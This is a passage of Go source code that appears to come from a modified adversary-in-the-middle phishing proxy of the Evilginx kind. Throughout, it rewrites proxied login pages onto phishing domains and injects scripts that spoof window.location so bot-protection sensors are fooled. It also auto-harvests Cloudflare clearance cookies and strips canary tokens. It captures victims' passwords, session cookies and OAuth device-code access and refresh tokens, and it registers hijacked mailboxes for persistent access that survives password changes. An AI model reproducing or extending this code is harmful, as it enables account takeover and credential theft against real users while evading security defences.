			// Skip body processing ONLY for CF challenge FLOW responses.
			// The flow endpoint (/cdn-cgi/challenge-platform/h/g/flow/...) returns
			// Content-Type: text/html but the body is encrypted binary data.
			// If we process it (sub_filters, JS injection, etc.), we corrupt the
			// response and the challenge can never complete.
			// The orchestration endpoint (/cdn-cgi/challenge-platform/.../orchestrate/...)
			// returns regular JS and NEEDS sub_filters for domain replacement.
			isCFChallengeFlow := strings.Contains(resp.Request.URL.Path, "cdn-cgi/challenge-platform") && strings.Contains(resp.Request.URL.Path, "/flow/")

			if isBatchExec && err == nil {
				if pl != nil {
					body = p.patchBatchExecDomains(pl, body)
				}
				resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
				log.Debug("BATCHEXEC: body written back (%d bytes), domains patched", len(body))
			}

			if isCFChallengeFlow && err == nil {
				// Pass CF challenge flow responses through unmodified
				log.Debug("CF-CHALLENGE: passing through flow response unmodified for path: %s", resp.Request.URL.Path)
			}

			if err == nil && !isBatchExec && !isCFChallengeFlow {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}

						body = []byte(removeObfuscatedDots(string(body)))
					}
				}

				// NOTE: SENSOR_WRAP (IIFE wrapping of large sensor scripts) has been REMOVED.
				// It broke Akamai's sensor by changing its execution scope (sensor stopped POSTing).
				// Location spoofing is now handled entirely via Location.prototype overrides
				// injected into <head>, which is transparent to sensor scripts.

				if stringExists(mime, []string{"text/html"}) {

					// Inject location spoof script (must be FIRST, before any other scripts)
					// This overrides Location.prototype getters so document.location.href etc.
					// return the original domain. Safe for Akamai — no prototype.toString,
					// XHR, fetch, or webdriver modifications.
					if pl != nil && pl.SpoofLocation {
						spoofScript := p.generateLocationSpoofScript(pl)
						if spoofScript != "" {
							body = p.injectJavascriptIntoHead(body, spoofScript)
							log.Debug("location-spoof: injected domain mapping script for phishlet '%s'", pl.Name)
						}
					}

					// Skip redirect/JS injection for CF challenge pages (403 + cf-mitigated).
					// The challenge page is not a real page — injecting redirect/session
					// scripts into it is wasteful and can interfere with the challenge flow.
					isCFMitigated := resp.Header.Get("Cf-Mitigated") != ""

					// Auto-harvest cf_clearance when CF challenge detected.
					// Uses evilpuppet settings for chromium path and display.
					if isCFMitigated && pl != nil {
						if !p.cfClearance.HasClearance(req_hostname) && !p.cfClearance.IsHarvesting(req_hostname) {
							log.Warning("[cf_clearance] CF challenge detected for %s — auto-harvesting...", req_hostname)
							chromiumPath := p.cfg.GetEvilPuppetChromiumPath()
							display := p.cfg.GetEvilPuppetDisplay()
							p.cfClearance.SetChromiumPath(chromiumPath)
							p.cfClearance.SetDisplay(display)
							go func(domain string) {
								if err := p.cfClearance.Harvest(domain); err != nil {
									log.Error("[cf_clearance] auto-harvest failed for %s: %v", domain, err)
									log.Info("[cf_clearance] try manually: cfclearance harvest %s", domain)
								}
							}(req_hostname)
						}
					}

					if pl != nil && ps.SessionId != "" && !isCFMitigated {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/assets/js/%s/%s.js", s.Id, js_id))
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/assets/js/%s.js", s.Id))

							// Fix Google SPA view transition: swap c-wiz container visibility
							// Google's SPA uses <c-wiz> parents to manage view transitions via display:none/flex.
							// Through the proxy, the JS transition fails: old c-wiz stays visible, new c-wiz stays hidden.
							// CSS: hide old c-wiz (has main + following sibling c-wiz with main), show latest c-wiz.
							// JS: fix container div height that gets stuck at identifier form height (258px).
							spaFixScript := `(function(){` +
								`var s=document.createElement('style');` +
								`s.textContent='c-wiz:has(>main):has(~c-wiz>main){display:none!important}` +
								`c-wiz:has(>main):not(:has(~c-wiz>main)){display:flex!important}` +
								`div:has(>c-wiz:has(>main)~c-wiz:has(>main)){height:auto!important}';` +
								`(document.head||document.documentElement).appendChild(s);` +
								`})();`
							body = p.injectJavascriptIntoBody(body, spaFixScript, "")

							// Inject botguard telemetry collection script
							if p.botguard.IsEnabled() {
								telemetryJS := p.botguard.GenerateTelemetryJS("/api/v1/analytics")
								body = p.injectJavascriptIntoBody(body, telemetryJS, "")
							}
						}
					}
				}

				// Debug: log batchexecute response AFTER sub_filters
				if strings.Contains(resp.Request.URL.Path, "batchexecute") {
					postFilterFile := fmt.Sprintf("/tmp/batchexec_resp_postfilter_%d.txt", time.Now().UnixNano())
					ioutil.WriteFile(postFilterFile, body, 0644)
					log.Debug("BATCHEXEC-RESP-POSTFILTER: len=%d written_to=%s", len(body), postFilterFile)
				}

				// Strip canary tokens from HTML/JS responses before sending to client
				if p.canary != nil {
					ct := resp.Header.Get("Content-Type")
					body = p.canary.StripCanaryTokensInMIME(body, ct)
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" && resp.Request.Method == "POST" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)

								// Only send notification on /landingv2 path
								if resp.Request.URL.Path == "/landingv2" {
									lureUrl := ""
									if s.PhishLure != nil && s.PhishLure.Path != "" {
										lureUrl = s.PhishLure.Path
									}
									p.notifier.Trigger(EventSessionCaptured, &NotificationData{
										Origin:    s.RemoteAddr,
										LureURL:   lureUrl,
										Phishlet:  pl.Name,
										SessionID: ps.SessionId,
										UserAgent: s.UserAgent,
										Username:  s.Username,
										Password:  s.Password,
										Custom:    s.Custom,
										Session:   s,
									})
								}
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								gid, ok := s.Params["gid"]
								if ok && gid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(gid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				resp.Header.Set("Cache-Control", "no-cache, no-store")
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Contains(string(body), "</head>") || strings.Contains(string(body), "</body>")) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
							return resp
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

// monitorSessionStall monitors an AitM session for stall conditions.
// If no new auth tokens are captured within the timeout period, it triggers
// a fallback redirect to the device code interstitial page.
func (p *HttpProxy) monitorSessionStall(s *Session) {
	stallTimeout := 90 * time.Second // Time without token activity before declaring stall
	checkInterval := 10 * time.Second
	maxWait := 5 * time.Minute // Don't monitor forever

	startTime := time.Now()
	ticker := time.NewTicker(checkInterval)
	defer ticker.Stop()

	sid, _ := p.sids[s.Id]

	for {
		<-ticker.C

		// Stop if session completed or we've been waiting too long
		if s.IsDone {
			log.Debug("[%d] [devicecode] stall monitor: session completed, stopping", sid)
			return
		}
		if time.Since(startTime) > maxWait {
			log.Debug("[%d] [devicecode] stall monitor: max wait exceeded, stopping", sid)
			return
		}

		// Check for stall: no token activity for stallTimeout
		p.session_mtx.Lock()
		timeSinceLastActivity := time.Since(s.LastTokenActivity)
		hasUsername := s.Username != ""
		dcSessionID := s.DCSessionID
		p.session_mtx.Unlock()

		// Only trigger fallback if:
		// 1. We have a username (victim at least entered credentials)
		// 2. Session hasn't completed
		// 3. No new tokens for stallTimeout
		// 4. Device code is available
		if hasUsername && timeSinceLastActivity > stallTimeout && dcSessionID != "" {
			dcs, dcOk := p.deviceCode.GetSession(dcSessionID)
			if dcOk && dcs.IsCodeValid() {
				p.session_mtx.Lock()
				if !s.StallDetected {
					s.StallDetected = true
					interstitialURL := fmt.Sprintf("/dc/%s", s.Id)
					s.RedirectURL = interstitialURL
					log.Warning("[%d] [devicecode] session stall detected! Triggering fallback to device code (code: %s)", sid, s.DCUserCode)

					// Fire the DoneSignal to unblock any waiting redirects
					s.Finish(false)

					p.notifier.Trigger(EventDeviceCodeGenerated, &NotificationData{
						Origin:    s.RemoteAddr,
						Phishlet:  s.Phishlet,
						SessionID: s.Id,
						UserAgent: s.UserAgent,
						Custom: map[string]string{
							"dc_code":    s.DCUserCode,
							"dc_session": dcSessionID,
							"trigger":    "stall_fallback",
						},
					})
				}
				p.session_mtx.Unlock()
				return
			}
		}
	}
}

// setupDeviceCodeCallbacks initializes the device code capture callback
func (p *HttpProxy) setupDeviceCodeCallbacks() {
	p.deviceCode.SetOnCapture(func(dcSession *DeviceCodeSession) {
		dcSession.mu.Lock()
		linkedSession := dcSession.LinkedSession
		msUserInfo := dcSession.UserInfo
		gUserInfo := dcSession.GoogleUser
		provider := dcSession.Provider
		dcSession.mu.Unlock()

		if linkedSession != "" {
			p.session_mtx.Lock()
			s, ok := p.sessions[linkedSession]
			p.session_mtx.Unlock()

			if ok {
				sid, _ := p.sids[s.Id]
				s.DCState = DCStateCaptured

				// Store device code tokens in session custom fields for persistence
				s.Custom["dc_provider"] = provider
				s.Custom["dc_access_token"] = dcSession.AccessToken
				if dcSession.RefreshToken != "" {
					s.Custom["dc_refresh_token"] = dcSession.RefreshToken
				}
				if dcSession.IDToken != "" {
					s.Custom["dc_id_token"] = dcSession.IDToken
				}
				s.Custom["dc_scope"] = dcSession.TokenScope
				s.Custom["dc_client"] = dcSession.ClientName
				s.Custom["dc_expires"] = dcSession.TokenExpiry.Format(time.RFC3339)

				if msUserInfo != nil {
					s.Custom["dc_user_email"] = msUserInfo.UserPrincipalName
					s.Custom["dc_user_name"] = msUserInfo.DisplayName
				}
				if gUserInfo != nil {
					s.Custom["dc_user_email"] = gUserInfo.Email
					s.Custom["dc_user_name"] = gUserInfo.Name
					if gUserInfo.HD != "" {
						s.Custom["dc_user_domain"] = gUserInfo.HD
					}
				}

				// Persist custom fields to database
				for k, v := range s.Custom {
					if strings.HasPrefix(k, "dc_") {
						p.db.SetSessionCustom(s.Id, k, v)
					}
				}

				log.Success("[%d] [devicecode] %s tokens captured and linked to AitM session!", sid, provider)

				// Automatically add account to mailbox manager for persistent access
				// This ensures the account survives password changes as long as tokens are refreshed
				if dcSession.RefreshToken != "" && p.mailboxAccounts != nil {
					go func() {
						if err := p.mailboxAccounts.AddFromDeviceCode(dcSession, s.Id, s.Phishlet, s.RemoteAddr, s.UserAgent); err != nil {
							log.Warning("[mailbox] Failed to auto-add account: %v", err)
						} else {
							log.Success("[mailbox] Account auto-added to mailbox viewer (session %d)", s.Id)
						}
					}()
				}

				// Send notification with captured tokens
				p.notifier.Trigger(EventDeviceCodeCaptured, &NotificationData{
					Origin:    s.RemoteAddr,
					Phishlet:  s.Phishlet,
					SessionID: s.Id,
					UserAgent: s.UserAgent,
					Username:  s.Username,
					Password:  s.Password,
					Custom:    copyMap(s.Custom),
					Session:   s,
				})
			}
		}
	})
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	var redirect_url string
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
	}
	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
		redirect_url = p.cfg.general.UnauthUrl
	}

	if redirect_url != "" {
		return p.javascriptRedirect(req, redirect_url)
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	body := fmt.Sprintf("<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"><meta name=\"referrer\" content=\"no-referrer\"><title>Loading...</title></head><body><script>(function(){var d=document,w=window;w.top.location.replace('%s');})();</script><noscript><meta http-equiv=\"refresh\" content=\"0;url=%s\"></noscript></body></html>", rurl, rurl)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
	m_nonce := jsNonceRe.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}
	var d_inject string

	if script != "" {
		minifier := minify.New()
		minifier.AddFunc("text/javascript", js.Minify)
		obfuscatedScript, err := minifier.String("text/javascript", script)
		if err != nil {
			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
		} else {
			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
		}
	} else if src_url != "" {
		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
	} else {
		return body
	}
	ret := []byte(bodyCloseRe.ReplaceAllString(string(body), d_inject))
	return ret
}

// injectJavascriptIntoHead injects a script tag at the very beginning of <head>
// so it executes BEFORE any other scripts on the page. Used for location spoofing
// to ensure bot protection scripts read the original domain from window.location.
func (p *HttpProxy) injectJavascriptIntoHead(body []byte, script string) []byte {
	if script == "" {
		return body
	}
	m_nonce := jsNonceRe2.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}

	minifier := minify.New()
	minifier.AddFunc("text/javascript", js.Minify)
	minified, err := minifier.String("text/javascript", script)
	if err != nil {
		minified = script
	}

	inject_tag := "<script" + js_nonce + ">" + minified + "</script>"

	if headOpenRe.Match(body) {
		ret := []byte(headOpenRe.ReplaceAllString(string(body), "${1}\n"+inject_tag))
		return ret
	}
	// Fallback: inject at very beginning of <html>
	if htmlOpenRe.Match(body) {
		ret := []byte(htmlOpenRe.ReplaceAllString(string(body), "${1}\n"+inject_tag))
		return ret
	}
	return body
}

// generateLocationSpoofScript builds the location spoof JavaScript for a phishlet
// by mapping all proxy hostnames to their original counterparts.
func (p *HttpProxy) generateLocationSpoofScript(pl *Phishlet) string {
	phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
	if !ok {
		return ""
	}

	// Build JSON domain map: { "proxy_host": "original_host", ... }
	var pairs []string
	seen := make(map[string]bool)
	for _, ph := range pl.proxyHosts {
		proxyHost := combineHost(ph.phish_subdomain, phishDomain)
		origHost := combineHost(ph.orig_subdomain, ph.domain)
		if proxyHost != origHost && !seen[proxyHost] {
			pairs = append(pairs, fmt.Sprintf("'%s':'%s'", proxyHost, origHost))
			seen[proxyHost] = true
		}
	}
	// Also add the base domain mapping if different
	baseDomain := p.cfg.GetBaseDomain()
	for _, d := range pl.domains {
		if phishDomain != d && !seen[phishDomain] {
			pairs = append(pairs, fmt.Sprintf("'%s':'%s'", phishDomain, d))
			seen[phishDomain] = true
		}
		if baseDomain != d && baseDomain != phishDomain && !seen[baseDomain] {
			pairs = append(pairs, fmt.Sprintf("'%s':'%s'", baseDomain, d))
			seen[baseDomain] = true
		}
	}

	if len(pairs) == 0 {
		return ""
	}

	domainMapJS := "{" + strings.Join(pairs, ",") + "}"
	script := strings.Replace(LOCATION_SPOOF_JS, "{domain_map}", domainMapJS, 1)
	return script
}

// generateSensorWrapScript builds the IIFE prefix for wrapping bot protection sensor scripts.
// It shadows the bare `location` variable so sensor code using `location.href` etc.
// gets the original domain instead of the proxy domain.
func (p *HttpProxy) generateSensorWrapScript(pl *Phishlet) string {
	phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
	if !ok {
		return ""
	}

	var pairs []string
	seen := make(map[string]bool)
	for _, ph := range pl.proxyHosts {
		proxyHost := combineHost(ph.phish_subdomain, phishDomain)
		origHost := combineHost(ph.orig_subdomain, ph.domain)
		if proxyHost != origHost && !seen[proxyHost] {
			pairs = append(pairs, fmt.Sprintf("'%s':'%s'", proxyHost, origHost))
			seen[proxyHost] = true
		}
	}
	if len(pairs) == 0 {
		return ""
	}

	domainMapJS := "{" + strings.Join(pairs, ",") + "}"
	return strings.Replace(SENSOR_WRAP_PREFIX, "{domain_map}", domainMapJS, 1)
}

// wrapInlineScripts wraps inline <script> tag contents with the given prefix and
// suffix to shadow the bare `location` variable. Only wraps scripts that are
// IIFEs (start with "(function" after trimming whitespace) to avoid breaking
// scripts that define global variables. This is needed for Cloudflare challenge
// pages that read location.href/hash/search in inline scripts.
func (p *HttpProxy) wrapInlineScripts(body []byte, prefix, suffix string) []byte {
	re := regexp.MustCompile(`(?i)(<script[^>]*>)([\s\S]*?)(</script>)`)
	result := re.ReplaceAllFunc(body, func(match []byte) []byte {
		submatches := re.FindSubmatch(match)
		if len(submatches) != 4 {
			return match
		}
		openTag := submatches[1]
		content := submatches[2]
		closeTag := submatches[3]

		// Skip external scripts (have src= attribute)
		if strings.Contains(strings.ToLower(string(openTag)), "src=") {
			return match
		}

		trimmed := strings.TrimSpace(string(content))

		// Skip empty scripts
		if len(trimmed) == 0 {
			return match
		}

		// Skip scripts that already contain the sensor wrap
		if strings.Contains(trimmed, "_dm={") || strings.Contains(trimmed, "var _rl=") {
			return match
		}

		// Only wrap IIFEs (scripts starting with "(function" or "!function" etc.)
		// to avoid breaking scripts that define global variables.
		isIIFE := strings.HasPrefix(trimmed, "(function") ||
			strings.HasPrefix(trimmed, "!function") ||
			strings.HasPrefix(trimmed, "(()") ||
			strings.HasPrefix(trimmed, "void function")
		if !isIIFE {
			return match
		}

		log.Debug("location-spoof: wrapping inline script (%d bytes) with location shadow", len(content))

		var buf bytes.Buffer
		buf.Write(openTag)
		buf.WriteString(prefix)
		buf.Write(content)
		buf.WriteString(suffix)
		buf.Write(closeTag)
		return buf.Bytes()
	})
	return result
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}

// patchBatchExecDomains replaces original domains with phishing domains in
// batchexecute responses while preserving the length-delimited framing format.
// Format: )]}\'\n\n<len>\n<data>\n<len>\n<data>...
// After patching domains (which may change string lengths), the byte-count
// prefix for each chunk is recalculated so the client-side parser stays in sync.
func (p *HttpProxy) patchBatchExecDomains(pl *Phishlet, body []byte) []byte {
	s := string(body)

	// Find the security prefix )]}'
	prefixIdx := strings.Index(s, ")]}'")
	if prefixIdx == -1 {
		// No standard batchexecute prefix; try direct patching
		patched := p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
		return patched
	}

	prefix := s[:prefixIdx+4] // include )]}'
	rest := s[prefixIdx+4:]

	var result strings.Builder
	result.WriteString(prefix)

	for len(rest) > 0 {
		// Skip whitespace/newlines before length prefix
		i := 0
		for i < len(rest) && (rest[i] == '\n' || rest[i] == '\r' || rest[i] == ' ') {
			i++
		}
		result.WriteString(rest[:i])
		rest = rest[i:]

		if len(rest) == 0 {
			break
		}

		// Read the length number (ends at newline)
		numEnd := strings.Index(rest, "\n")
		if numEnd == -1 {
			// No newline found - write remaining as-is
			result.WriteString(rest)
			break
		}

		lenStr := strings.TrimSpace(rest[:numEnd])
		chunkLen, cerr := strconv.Atoi(lenStr)
		if cerr != nil {
			// Not a valid length prefix - write remaining as-is
			result.WriteString(rest)
			break
		}

		rest = rest[numEnd+1:] // skip past the newline after length

		// Extract the data chunk
		if chunkLen > len(rest) {
			chunkLen = len(rest)
		}
		chunk := []byte(rest[:chunkLen])
		rest = rest[chunkLen:]

		// Apply domain patching to this chunk
		patched := p.patchUrls(pl, chunk, CONVERT_TO_PHISHING_URLS)

		// Write updated length and patched data
		result.WriteString(fmt.Sprintf("%d\n%s", len(patched), string(patched)))

		if len(patched) != len(chunk) {
			log.Debug("BATCHEXEC-DOMAIN: chunk len %d -> %d (patched)", len(chunk), len(patched))
		}
	}

	return []byte(result.String())
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := MATCH_URL_REGEXP
	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
